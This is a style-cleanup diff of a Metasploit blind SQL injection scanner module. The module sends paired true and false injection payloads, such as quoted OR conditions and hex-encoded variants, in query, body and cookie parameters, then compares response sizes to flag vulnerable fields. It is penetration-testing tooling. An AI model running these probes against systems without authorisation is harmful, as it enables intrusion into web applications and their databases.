@@ -3,36 +3,40 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-
-
-
-
 class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::WmapScanUniqueQuery
   include Msf::Auxiliary::Scanner
   include Msf::Auxiliary::Report
 
-
   def initialize(info = {})
-    super(update_info(info,
-      'Name'   		=> 'HTTP Blind SQL Injection Scanner',
-      'Description'	=> %q{
-        This module identifies the existence of Blind SQL injection issues
-        in GET/POST Query parameters values.
-      },
-      'Author' 		=> [ 'et [at] cyberspace.org' ],
-      'License'		=> BSD_LICENSE))
+    super(
+      update_info(
+        info,
+        'Name' => 'HTTP Blind SQL Injection Scanner',
+        'Description'	=> %q{
+          This module identifies the existence of Blind SQL injection issues
+          in GET/POST Query parameters values.
+        },
+        'Author' => [ 'et [at] cyberspace.org' ],
+        'License'	=> BSD_LICENSE,
+        'Notes' => {
+          'Reliability' => UNKNOWN_RELIABILITY,
+          'Stability' => UNKNOWN_STABILITY,
+          'SideEffects' => UNKNOWN_SIDE_EFFECTS
+        }
+      )
+    )
 
     register_options(
       [
         OptEnum.new('METHOD', [true, 'HTTP Method', 'GET', ['GET', 'POST'] ]),
-        OptString.new('PATH', [ true,  "The path/file to test SQL injection", '/index.asp']),
-        OptString.new('QUERY', [ false,  "HTTP URI Query", '']),
+        OptString.new('PATH', [ true, "The path/file to test SQL injection", '/index.asp']),
+        OptString.new('QUERY', [ false, "HTTP URI Query", '']),
         OptString.new('DATA', [ false, "HTTP Body Data", '']),
-        OptString.new('COOKIE',[ false, "HTTP Cookies", ''])
-      ])
-
+        OptString.new('COOKIE', [ false, "HTTP Cookies", ''])
+      ]
+    )
   end
 
   def run_host(ip)
@@ -44,36 +48,43 @@ class MetasploitModule < Msf::Auxiliary
     pvars = Hash.new()
     cvars = Hash.new()
 
-    rnum=rand(10000)
+    rnum = rand(10000)
 
     inivalstr = [
-      [ 'numeric',
-      " AND #{rnum}=#{rnum} ",
-      " AND #{rnum}=#{rnum+1} "
+      [
+        'numeric',
+        " AND #{rnum}=#{rnum} ",
+        " AND #{rnum}=#{rnum + 1} "
       ],
-      [ 'single quotes',
-      "' AND '#{rnum}'='#{rnum}",
-      "' AND '#{rnum}'='#{rnum+1}"
+      [
+        'single quotes',
+        "' AND '#{rnum}'='#{rnum}",
+        "' AND '#{rnum}'='#{rnum + 1}"
       ],
-      [ 'double quotes',
-      "\" AND \"#{rnum}\"=\"#{rnum}",
-      "\" AND \"#{rnum}\"=\"#{rnum+1}"
+      [
+        'double quotes',
+        "\" AND \"#{rnum}\"=\"#{rnum}",
+        "\" AND \"#{rnum}\"=\"#{rnum + 1}"
       ],
-      [ 'OR single quotes uncommented',
-      "' OR '#{rnum}'='#{rnum}",
-      "' OR '#{rnum}'='#{rnum+1}"
+      [
+        'OR single quotes uncommented',
+        "' OR '#{rnum}'='#{rnum}",
+        "' OR '#{rnum}'='#{rnum + 1}"
       ],
-      [ 'OR single quotes closed and commented',
-      "' OR '#{rnum}'='#{rnum}'--",
-      "' OR '#{rnum}'='#{rnum+1}'--"
+      [
+        'OR single quotes closed and commented',
+        "' OR '#{rnum}'='#{rnum}'--",
+        "' OR '#{rnum}'='#{rnum + 1}'--"
       ],
-      [ 'hex encoded OR single quotes uncommented',
-      "'%20OR%20'#{rnum}'%3D'#{rnum}",
-      "'%20OR%20'#{rnum}'%3D'#{rnum+1}"
+      [
+        'hex encoded OR single quotes uncommented',
+        "'%20OR%20'#{rnum}'%3D'#{rnum}",
+        "'%20OR%20'#{rnum}'%3D'#{rnum + 1}"
       ],
-      [ 'hex encoded OR single quotes closed and commented',
-      "'%20OR%20'#{rnum}'%3D'#{rnum}'--",
-      "'%20OR%20'#{rnum}'%3D'#{rnum+1}'--"
+      [
+        'hex encoded OR single quotes closed and commented',
+        "'%20OR%20'#{rnum}'%3D'#{rnum}'--",
+        "'%20OR%20'#{rnum}'%3D'#{rnum + 1}'--"
       ]
     ]
 
@@ -83,60 +94,60 @@ class MetasploitModule < Msf::Auxiliary
       # With true values
       valstr << vstr
       # With false values, appending 'x' to real value
-      valstr << ['False char '+vstr[0],'x'+vstr[1],'x'+vstr[2]]
+      valstr << ['False char ' + vstr[0], 'x' + vstr[1], 'x' + vstr[2]]
       # With false values, appending '0' to real value
-      valstr << ['False num '+vstr[0],'0'+vstr[1],'0'+vstr[2]]
+      valstr << ['False num ' + vstr[0], '0' + vstr[1], '0' + vstr[2]]
     end
 
-    #valstr.each do |v|
+    # valstr.each do |v|
     #	print_status("#{v[0]}")
     #	print_status("#{v[1]}")
     #	print_status("#{v[2]}")
-    #end
+    # end
 
     #
     # Dealing with empty query/data and making them hashes.
     #
 
-    if  !datastore['QUERY'] or datastore['QUERY'].empty?
+    if !datastore['QUERY'] or datastore['QUERY'].empty?
       datastore['QUERY'] = nil
       gvars = nil
     else
-      gvars = queryparse(datastore['QUERY']) #Now its a Hash
+      gvars = queryparse(datastore['QUERY']) # Now its a Hash
     end
 
-    if  !datastore['DATA'] or datastore['DATA'].empty?
+    if !datastore['DATA'] or datastore['DATA'].empty?
       datastore['DATA'] = nil
       pvars = nil
     else
       pvars = queryparse(datastore['DATA'])
     end
 
-    if  !datastore['COOKIE'] or datastore['COOKIE'].empty?
+    if !datastore['COOKIE'] or datastore['COOKIE'].empty?
       datastore['COOKIE'] = nil
       cvars = nil
     else
       cvars = queryparse(datastore['COOKIE'])
     end
 
-    verifynr=2
+    verifynr = 2
 
-    i=0
-    k=0
-    c=0
+    i = 0
+    k = 0
+    c = 0
 
     normalres = nil
 
     verifynr.times do |j|
-    #SEND NORMAL REQUEST
+      # SEND NORMAL REQUEST
       begin
         normalres = send_request_cgi({
-          'uri'  		=> normalize_uri(datastore['PATH']),
-          'vars_get' 	=> gvars,
-          'method'   	=> http_method,
-          'ctype'		=> 'application/x-www-form-urlencoded',
-          'cookie'    => datastore['COOKIE'],
-          'data'      => datastore['DATA']
+          'uri' => normalize_uri(datastore['PATH']),
+          'vars_get' => gvars,
+          'method' => http_method,
+          'ctype'	=> 'application/x-www-form-urlencoded',
+          'cookie' => datastore['COOKIE'],
+          'data' => datastore['DATA']
         }, 20)
       rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
       rescue ::Timeout::Error, ::Errno::EPIPE
@@ -146,7 +157,7 @@ class MetasploitModule < Msf::Auxiliary
         print_error("No response")
         return
       else
-        if i==0
+        if i == 0
           k = normalres.body.length
           c = normalres.code.to_i
         else
@@ -167,41 +178,41 @@ class MetasploitModule < Msf::Auxiliary
     pinj = false
 
     valstr.each do |tarr|
-      #QUERY
+      # QUERY
       if gvars
-        gvars.each do |key,value|
+        gvars.each do |key, value|
           vprint_status("- Testing '#{tarr[0]}' Parameter #{key}:")
 
-          #SEND TRUE REQUEST
-          testgvars = queryparse(datastore['QUERY']) #Now its a Hash
-          testgvars[key] = testgvars[key]+tarr[1]
+          # SEND TRUE REQUEST
+          testgvars = queryparse(datastore['QUERY']) # Now its a Hash
+          testgvars[key] = testgvars[key] + tarr[1]
           t = testgvars[key]
 
           begin
             trueres = send_request_cgi({
-              'uri'  		=>  normalize_uri(datastore['PATH']),
-              'vars_get' 	=>  testgvars,
-              'method'   	=>  http_method,
-              'ctype'		=> 'application/x-www-form-urlencoded',
-              'cookie'    => datastore['COOKIE'],
-              'data'      => datastore['DATA']
+              'uri' => normalize_uri(datastore['PATH']),
+              'vars_get' => testgvars,
+              'method' => http_method,
+              'ctype'	=> 'application/x-www-form-urlencoded',
+              'cookie' => datastore['COOKIE'],
+              'data' => datastore['DATA']
             }, 20)
           rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
           rescue ::Timeout::Error, ::Errno::EPIPE
           end
 
-          #SEND FALSE REQUEST
-          testgvars = queryparse(datastore['QUERY']) #Now its a Hash
-          testgvars[key] = testgvars[key]+tarr[2]
+          # SEND FALSE REQUEST
+          testgvars = queryparse(datastore['QUERY']) # Now its a Hash
+          testgvars[key] = testgvars[key] + tarr[2]
 
           begin
             falseres = send_request_cgi({
-              'uri'  		=>  normalize_uri(datastore['PATH']),
-              'vars_get' 	=>  testgvars,
-              'method'   	=>  http_method,
-              'ctype'		=> 'application/x-www-form-urlencoded',
-              'cookie'    => datastore['COOKIE'],
-              'data'      => datastore['DATA']
+              'uri' => normalize_uri(datastore['PATH']),
+              'vars_get' => testgvars,
+              'method' => http_method,
+              'ctype'	=> 'application/x-www-form-urlencoded',
+              'cookie' => datastore['COOKIE'],
+              'data' => datastore['DATA']
             }, 20)
           rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
           rescue ::Timeout::Error, ::Errno::EPIPE
@@ -212,101 +223,10 @@ class MetasploitModule < Msf::Auxiliary
           pinjc = false
           pinjd = false
 
-          pinja = detection_a(normalres,trueres,falseres,tarr)
-          pinjb = detection_b(normalres,trueres,falseres,tarr)
-          pinjc = detection_c(normalres,trueres,falseres,tarr)
-          pinjd = detection_d(normalres,trueres,falseres,tarr)
-
-          if pinja or pinjb or pinjc  or pinjd
-            print_good("Possible #{tarr[0]} Blind SQL Injection Found  #{datastore['PATH']} #{key}")
-            print_good("[#{t}]")
-
-            report_web_vuln(
-              :host	=> ip,
-              :port	=> rport,
-              :vhost  => vhost,
-              :ssl    => ssl,
-              :path	=> normalize_uri(datastore['PATH']),
-              :method => http_method,
-              :pname  => key,
-              :proof  => "blind sql inj.",
-              :risk   => 2,
-              :confidence   => 50,
-              :category     => 'SQL injection',
-              :description  => "Blind sql injection of type #{tarr[0]} in param #{key}",
-              :name   => 'Blind SQL injection'
-            )
-          else
-            vprint_status("NOT Vulnerable #{datastore['PATH']} parameter #{key}")
-          end
-        end
-      end
-
-      #DATA
-      if pvars
-        pvars.each do |key,value|
-          print_status("- Testing '#{tarr[0]}' Parameter #{key}:")
-
-          #SEND TRUE REQUEST
-          testpvars = queryparse(datastore['DATA']) #Now its a Hash
-          testpvars[key] = testpvars[key]+tarr[1]
-          t = testpvars[key]
-
-          pvarstr = ""
-          testpvars.each do |tkey,tvalue|
-            if pvarstr
-              pvarstr << '&'
-            end
-            pvarstr << tkey+'='+tvalue
-          end
-
-          begin
-            trueres = send_request_cgi({
-              'uri'  		=>  normalize_uri(datastore['PATH']),
-              'vars_get' 	=>  gvars,
-              'method'   	=>  http_method,
-              'ctype'		=> 'application/x-www-form-urlencoded',
-              'cookie'    => datastore['COOKIE'],
-              'data'      => pvarstr
-            }, 20)
-          rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
-          rescue ::Timeout::Error, ::Errno::EPIPE
-          end
-
-          #SEND FALSE REQUEST
-          testpvars = queryparse(datastore['DATA']) #Now its a Hash
-          testpvars[key] = testpvars[key]+tarr[2]
-
-          pvarstr = ""
-          testpvars.each do |tkey,tvalue|
-            if pvarstr
-              pvarstr << '&'
-            end
-            pvarstr << tkey+'='+tvalue
-          end
-
-          begin
-            falseres = send_request_cgi({
-              'uri'  		=>  normalize_uri(datastore['PATH']),
-              'vars_get' 	=>  gvars,
-              'method'   	=>  http_method,
-              'ctype'		=> 'application/x-www-form-urlencoded',
-              'cookie'    => datastore['COOKIE'],
-              'data'      => pvarstr
-            }, 20)
-          rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
-          rescue ::Timeout::Error, ::Errno::EPIPE
-          end
-
-          pinja = false
-          pinjb = false
-          pinjc = false
-          pinjd = false
-
-          pinja = detection_a(normalres,trueres,falseres,tarr)
-          pinjb = detection_b(normalres,trueres,falseres,tarr)
-          pinjc = detection_c(normalres,trueres,falseres,tarr)
-          pinjd = detection_d(normalres,trueres,falseres,tarr)
+          pinja = detection_a(normalres, trueres, falseres, tarr)
+          pinjb = detection_b(normalres, trueres, falseres, tarr)
+          pinjc = detection_c(normalres, trueres, falseres, tarr)
+          pinjd = detection_d(normalres, trueres, falseres, tarr)
 
           if pinja or pinjb or pinjc or pinjd
             print_good("Possible #{tarr[0]} Blind SQL Injection Found  #{datastore['PATH']} #{key}")
@@ -315,17 +235,108 @@ class MetasploitModule < Msf::Auxiliary
             report_web_vuln(
               :host	=> ip,
               :port	=> rport,
-              :vhost  => vhost,
-              :ssl    => ssl,
+              :vhost => vhost,
+              :ssl => ssl,
+              :path	=> normalize_uri(datastore['PATH']),
+              :method => http_method,
+              :pname => key,
+              :proof => "blind sql inj.",
+              :risk => 2,
+              :confidence => 50,
+              :category => 'SQL injection',
+              :description => "Blind sql injection of type #{tarr[0]} in param #{key}",
+              :name => 'Blind SQL injection'
+            )
+          else
+            vprint_status("NOT Vulnerable #{datastore['PATH']} parameter #{key}")
+          end
+        end
+      end
+
+      # DATA
+      if pvars
+        pvars.each do |key, value|
+          print_status("- Testing '#{tarr[0]}' Parameter #{key}:")
+
+          # SEND TRUE REQUEST
+          testpvars = queryparse(datastore['DATA']) # Now its a Hash
+          testpvars[key] = testpvars[key] + tarr[1]
+          t = testpvars[key]
+
+          pvarstr = ""
+          testpvars.each do |tkey, tvalue|
+            if pvarstr
+              pvarstr << '&'
+            end
+            pvarstr << tkey + '=' + tvalue
+          end
+
+          begin
+            trueres = send_request_cgi({
+              'uri' => normalize_uri(datastore['PATH']),
+              'vars_get' => gvars,
+              'method' => http_method,
+              'ctype'	=> 'application/x-www-form-urlencoded',
+              'cookie' => datastore['COOKIE'],
+              'data' => pvarstr
+            }, 20)
+          rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
+          rescue ::Timeout::Error, ::Errno::EPIPE
+          end
+
+          # SEND FALSE REQUEST
+          testpvars = queryparse(datastore['DATA']) # Now its a Hash
+          testpvars[key] = testpvars[key] + tarr[2]
+
+          pvarstr = ""
+          testpvars.each do |tkey, tvalue|
+            if pvarstr
+              pvarstr << '&'
+            end
+            pvarstr << tkey + '=' + tvalue
+          end
+
+          begin
+            falseres = send_request_cgi({
+              'uri' => normalize_uri(datastore['PATH']),
+              'vars_get' => gvars,
+              'method' => http_method,
+              'ctype'	=> 'application/x-www-form-urlencoded',
+              'cookie' => datastore['COOKIE'],
+              'data' => pvarstr
+            }, 20)
+          rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
+          rescue ::Timeout::Error, ::Errno::EPIPE
+          end
+
+          pinja = false
+          pinjb = false
+          pinjc = false
+          pinjd = false
+
+          pinja = detection_a(normalres, trueres, falseres, tarr)
+          pinjb = detection_b(normalres, trueres, falseres, tarr)
+          pinjc = detection_c(normalres, trueres, falseres, tarr)
+          pinjd = detection_d(normalres, trueres, falseres, tarr)
+
+          if pinja or pinjb or pinjc or pinjd
+            print_good("Possible #{tarr[0]} Blind SQL Injection Found  #{datastore['PATH']} #{key}")
+            print_good("[#{t}]")
+
+            report_web_vuln(
+              :host	=> ip,
+              :port	=> rport,
+              :vhost => vhost,
+              :ssl => ssl,
               :path	=> datastore['PATH'],
               :method => http_method,
-              :pname  => key,
-              :proof  => "blind sql inj.",
-              :risk   => 2,
-              :confidence   => 50,
-              :category     => 'SQL injection',
-              :description  => "Blind sql injection of type #{tarr[0]} in param #{key}",
-              :name   => 'Blind SQL injection'
+              :pname => key,
+              :proof => "blind sql inj.",
+              :risk => 2,
+              :confidence => 50,
+              :category => 'SQL injection',
+              :description => "Blind sql injection of type #{tarr[0]} in param #{key}",
+              :name => 'Blind SQL injection'
             )
           else
             vprint_status("NOT Vulnerable #{datastore['PATH']} parameter #{key}")
@@ -335,24 +346,24 @@ class MetasploitModule < Msf::Auxiliary
     end
   end
 
-  def detection_a(normalr,truer,falser,tarr)
+  def detection_a(normalr, truer, falser, tarr)
     # print_status("A")
 
     # DETECTION A
     # Very simple way to compare responses, this can be improved a lot , at this time just the simple way
 
     if normalr and truer
-      #Very simple way to compare responses, this can be improved a lot , at this time just the simple way
-      reltruesize = truer.body.length-(truer.body.scan(/#{tarr[1]}/).length*tarr[1].length)
+      # Very simple way to compare responses, this can be improved a lot , at this time just the simple way
+      reltruesize = truer.body.length - (truer.body.scan(/#{tarr[1]}/).length * tarr[1].length)
       normalsize = normalr.body.length
 
-      #print_status("normalsize #{normalsize} truesize #{reltruesize}")
+      # print_status("normalsize #{normalsize} truesize #{reltruesize}")
 
       if reltruesize == normalsize
         if falser
-          relfalsesize = falser.body.length-(falser.body.scan(/#{tarr[2]}/).length*tarr[2].length)
+          relfalsesize = falser.body.length - (falser.body.scan(/#{tarr[2]}/).length * tarr[2].length)
 
-          #print_status("falsesize #{relfalsesize}")
+          # print_status("falsesize #{relfalsesize}")
 
           if reltruesize > relfalsesize
             print_status("Detected by test A")
@@ -373,7 +384,7 @@ class MetasploitModule < Msf::Auxiliary
     return false
   end
 
-  def detection_b(normalr,truer,falser,tarr)
+  def detection_b(normalr, truer, falser, tarr)
     # print_status("B")
 
     # DETECTION B
@@ -381,13 +392,13 @@ class MetasploitModule < Msf::Auxiliary
 
     if normalr and truer
       if falser
-        #print_status("N: #{normalr.body.length} T: #{truer.body.length} F: #{falser.body.length} T1: #{tarr[1].length}  F2: #{tarr[2].length} #{tarr[1].length+tarr[2].length}")
+        # print_status("N: #{normalr.body.length} T: #{truer.body.length} F: #{falser.body.length} T1: #{tarr[1].length}  F2: #{tarr[2].length} #{tarr[1].length+tarr[2].length}")
 
-        if (truer.body.length-tarr[1].length) != normalr.body.length and (falser.body.length-tarr[2].length) == normalr.body.length
+        if (truer.body.length - tarr[1].length) != normalr.body.length and (falser.body.length - tarr[2].length) == normalr.body.length
           print_status("Detected by test B")
           return true
         end
-        if (truer.body.length-tarr[1].length) == normalr.body.length and (falser.body.length-tarr[2].length) != normalr.body.length
+        if (truer.body.length - tarr[1].length) == normalr.body.length and (falser.body.length - tarr[2].length) != normalr.body.length
           print_status("Detected by test B")
           return true
         end
@@ -397,7 +408,7 @@ class MetasploitModule < Msf::Auxiliary
     return false
   end
 
-  def detection_c(normalr,truer,falser,tarr)
+  def detection_c(normalr, truer, falser, tarr)
     # print_status("C")
 
     # DETECTION C
@@ -419,7 +430,7 @@ class MetasploitModule < Msf::Auxiliary
     return false
   end
 
-  def detection_d(normalr,truer,falser,tarr)
+  def detection_d(normalr, truer, falser, tarr)
     # print_status("D")
 
     # DETECTION D
@@ -431,9 +442,9 @@ class MetasploitModule < Msf::Auxiliary
 
     if normalr and truer
       if falser
-        nl= normalr.body.length
-        tl= truer.body.length
-        fl= falser.body.length
+        nl = normalr.body.length
+        tl = truer.body.length
+        fl = falser.body.length
 
         if nl == 0
           nl = 1
@@ -445,20 +456,20 @@ class MetasploitModule < Msf::Auxiliary
           fl = 1
         end
 
-        ntmax = [ nl,tl ].max
-        ntmin = [ nl,tl ].min
-        diff_nt_perc = ((ntmax - ntmin)*100)/(ntmax)
-        diff_nt_f_perc = ((ntmax - fl)*100)/(ntmax)
+        ntmax = [ nl, tl ].max
+        ntmin = [ nl, tl ].min
+        diff_nt_perc = ((ntmax - ntmin) * 100) / (ntmax)
+        diff_nt_f_perc = ((ntmax - fl) * 100) / (ntmax)
 
         if diff_nt_perc <= max_diff_perc and diff_nt_f_perc > min_diff_perc
           print_status("Detected by test D")
           return true
         end
 
-        nfmax = [ nl,fl ].max
-        nfmin = [ nl,fl ].min
-        diff_nf_perc = ((nfmax - nfmin)*100)/(nfmax)
-        diff_nf_t_perc = ((nfmax - tl)*100)/(nfmax)
+        nfmax = [ nl, fl ].max
+        nfmin = [ nl, fl ].min
+        diff_nf_perc = ((nfmax - nfmin) * 100) / (nfmax)
+        diff_nf_t_perc = ((nfmax - tl) * 100) / (nfmax)
 
         if diff_nf_perc <= max_diff_perc and diff_nf_t_perc > min_diff_perc
           print_status("Detected by test D")
